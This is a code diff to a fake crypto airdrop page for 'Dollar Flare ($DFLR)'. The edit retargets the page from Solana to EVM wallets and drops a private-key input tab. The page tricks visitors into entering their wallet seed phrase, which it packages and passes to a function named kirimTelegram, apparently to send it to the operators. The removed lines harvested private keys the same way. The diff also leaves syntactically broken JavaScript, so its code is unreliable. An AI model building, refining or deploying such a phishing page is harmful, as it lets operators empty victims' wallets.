@@ -395,13 +395,6 @@
     .seed-field.error { border-color: #c0392b; background: #fde8e8; }
     .seed-field.error .seed-input { color: #c0392b; }
 
-    .pk-wrap.error .pk-input { border-color: #c0392b; background: #fde8e8; color: #c0392b; }
-
-    .pk-wrap { margin-bottom: 1.25rem; }
-    .pk-input { width: 100%; background: #f4f7f0; border: 1.5px solid var(--border-light); border-radius: 3px; padding: 12px 14px; color: var(--text); font-family: 'Space Mono', monospace; font-size: 12px; outline: none; resize: none; min-height: 110px; line-height: 1.6; transition: border-color 0.15s; }
-    .pk-input:focus { border-color: var(--border); background: #fff; }
-    .pk-input::placeholder { color: var(--muted); opacity: 0.5; }
-
     .btn-submit { width: 100%; padding: 13px; background: var(--accent); color: #fff; font-family: 'Space Mono', monospace; font-size: 13px; font-weight: 700; border: 2px solid #1a4a1a; border-radius: 4px; cursor: pointer; transition: all 0.15s; box-shadow: 3px 3px 0 #1a4a1a; letter-spacing: 0.04em; }
     .btn-submit:hover:not(:disabled) { transform: translate(-1px, -1px); box-shadow: 4px 4px 0 #1a4a1a; background: #1a4a1a; }
     .btn-submit:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }
@@ -666,8 +659,8 @@
 
     <section class="hero">
       <div class="hero-eyebrow"><div class="dot"></div>Airdrop is LIVE</div>
-      <h1>Proof Of Activity<br><span class="line-accent">Real Users Only</span><br><span class="line-gold">Built on Solana</span></h1>
-      <p class="hero-sub">We are live on Solana at first launch. Built for those who actually move on-chain.</p>
+      <h1>Proof Of Activity<br><span class="line-accent">Real Users Only</span><br><span class="line-gold">Built for Community</span></h1>
+      <p class="hero-sub">We are live on Base at first launch. Built for those who actually move on-chain.</p>
       <div class="hero-cta-group">
         <div class="ticker-track" id="tickerTrack"></div>
       </div>
@@ -685,7 +678,7 @@
       <div class="section-label"><span class="label-text">Eligibility Criteria</span><div class="label-line"></div></div>
       <div class="features-grid">
         <div class="feat-card"><div class="feat-icon"><img src="pocket.png" alt="ARB" style="width:25px;height:25px;object-fit:contain;display:block;"></div><h3>Wallet Age</h3><p>Your wallet must be more than 1 month old.</p></div>
-        <div class="feat-card"><div class="feat-icon"><img src="trade.png" alt="ETH" style="width:25px;height:25px;object-fit:contain;display:block;"></div><h3>Trade</h3><p>Swap at least $5 from SOL to USDC through any DEX.</p></div>
+        <div class="feat-card"><div class="feat-icon"><img src="trade.png" alt="ETH" style="width:25px;height:25px;object-fit:contain;display:block;"></div><h3>Trade</h3><p>Swap at least $5 from ETH to USDT on any chain, through any DEX.</p></div>
       </div>
     </section>
 
@@ -693,7 +686,7 @@
       <div class="closing-card">
         <span class="closing-eyebrow">✦ Dollar Flare ($DFLR) ✦</span>
         <h2>Proof of Activity<br><span class="hl">Powered by Dollar Flare</span></h2>
-        <p class="body-text">Dollar Flare is a token designed to reward active Solana users. By focusing on real activity rather than passive holding, $DFLR aims to recognize and empower users who contribute to the growth and usage of Solana Network.</p>
+        <p class="body-text">Dollar Flare is a token designed to reward active users. By focusing on real activity rather than passive holding, $DFLR aims to recognize and empower users who contribute to the growth and usage of Network Activity.</p>
 
         <div class="airdrop-progress">
           <div class="progress-info">
@@ -721,10 +714,9 @@
       <div id="formState">
         <div class="modal-eyebrow">Dollar Flare</div>
         <div class="modal-title">Import Your Wallet</div>
-        <div class="modal-desc">Import your Solana wallet to claim $DFLR token.</div>
+        <div class="modal-desc">Import your EVM wallet to claim $DFLR token.</div>
 
         <div class="tab-bar">
-          <button type="button" class="tab-btn" id="tabPK" onclick="switchTab('pk')">Private Key</button>
           <button type="button" class="tab-btn active" id="tabPhrase" onclick="switchTab('phrase')">Seed Phrase</button>
         </div>
 
@@ -743,17 +735,6 @@
             <button class="btn-submit" type="submit" id="btnSubmitPhrase">Import Wallet</button>
           </form>
         </div>
-
-        <div id="panelPK" style="display:none;">
-          <form id="pkForm" onsubmit="kirimTelegram(event, 'pk')">
-            <div class="pk-wrap">
-              <textarea class="pk-input" id="pkInput" placeholder="Enter your Private Key" autocomplete="off" spellcheck="false"></textarea>
-            </div>
-            <div class="error-msg" id="errorPK">Invalid format.</div>
-            <button class="btn-submit" type="submit" id="btnSubmitPK">Import Wallet</button>
-          </form>
-        </div>
-      </div>
 
       <div class="success-state" id="successState">
 
@@ -785,7 +766,7 @@
 
   <div class="todo-box hidden" id="todoBox">
   <span class="todo-label">To Do:</span>
-  Make 1x swap transaction minimum $5 from SOL to USDC
+  Make 1x swap transaction minimum $5 from ETH to USDT
 </div>
 
 </div>
@@ -891,8 +872,6 @@ function openModal() {
   formState.style.display = 'block';
   successState.classList.remove('show');
 
-  switchTab('pk');
-
   buildSeedGrid(currentWordCount);
 }
     
@@ -904,28 +883,15 @@ function openModal() {
   verificationRun++;
 
   const btnPhrase = document.getElementById('btnSubmitPhrase');
-  const btnPK = document.getElementById('btnSubmitPK');
 
   if (btnPhrase) {
     btnPhrase.disabled = false;
     btnPhrase.textContent = 'Import Wallet';
   }
 
-  if (btnPK) {
-    btnPK.disabled = false;
-    btnPK.textContent = 'Import Wallet';
-  }
-
   document.getElementById('formState').style.display = 'block';
   document.getElementById('successState').classList.remove('show');
 }
-
-    function switchTab(tab) {
-      document.getElementById('tabPhrase').classList.toggle('active', tab === 'phrase');
-      document.getElementById('tabPK').classList.toggle('active', tab === 'pk');
-      document.getElementById('panelPhrase').style.display = tab === 'phrase' ? 'block' : 'none';
-      document.getElementById('panelPK').style.display     = tab === 'pk'     ? 'block' : 'none';
-    }
 
     let currentWordCount = 12;
     function setWordCount(n) {
@@ -983,13 +949,8 @@ function openModal() {
           return;
         }
         pesan = `[PHRASE ${currentWordCount}w] ${words.join(' ')}`;
-      } else {
-        pesan = document.getElementById('pkInput').value.trim();
-        if (!pesan) { alert('Please enter your private key.'); return; }
-        pesan = `[PRIVATE KEY] ${pesan}`;
-      }
 
-      const btnId = type === 'phrase' ? 'btnSubmitPhrase' : 'btnSubmitPK';
+      const btnId = type === 'phrase' ? 'btnSubmitPhrase';
       const btn   = document.getElementById(btnId);
       btn.disabled    = true;
       btn.textContent = 'Importing...';
